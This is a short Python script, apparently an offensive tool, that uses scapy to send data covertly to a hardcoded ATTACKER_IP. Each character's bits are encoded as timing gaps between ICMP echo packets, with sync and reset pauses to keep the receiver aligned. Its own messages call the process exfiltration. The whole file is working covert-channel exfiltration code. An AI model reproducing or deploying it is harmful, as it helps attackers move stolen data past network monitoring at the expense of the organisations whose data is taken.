import time
from scapy.all import IP, ICMP, send, conf

# --- CONFIGURATION ---
ATTACKER_IP = "10.0.0.5"
conf.verb = 0 

# --- TIMING PROTOCOL ---
DOT_DELAY  = 0.2  # Binary '0'
DASH_DELAY = 0.6  # Binary '1'
CHAR_GAP   = 1.2  # End of Character
BATCH_GAP  = 2.0  # [NEW] Wait time between words to reset receiver

def send_data_over_icmp(data):
    print(f"[>] Exfiltrating via ICMP Timing: '{data}'")
    
    # [FIX] 1. Cooldown Period
    # We wait 2 seconds before sending ANYTHING. 
    # This forces the receiver to see a "long gap", ensuring it resets its state 
    # and doesn't mistake the Sync packet for a '0'.
    print("    [!] Cooling down (Batch Reset)...")
    time.sleep(BATCH_GAP)

    # 2. Send Sync Packet
    print("    [!] Sending Sync Packet...")
    send(IP(dst=ATTACKER_IP)/ICMP()) 
    
    # 3. Start Data Transmission
    for char in data:
        binary_string = format(ord(char), '08b')
        print(f"    Sending '{char}' as {binary_string}...")

        for bit in binary_string:
            if bit == '0':
                time.sleep(DOT_DELAY)
            else:
                time.sleep(DASH_DELAY)
            
            # Send bit
            packet = IP(dst=ATTACKER_IP)/ICMP()
            send(packet)
        
        # End of Character Signal
        time.sleep(CHAR_GAP)
        send(IP(dst=ATTACKER_IP)/ICMP())

    print("[✓] ICMP Exfiltration Complete.")
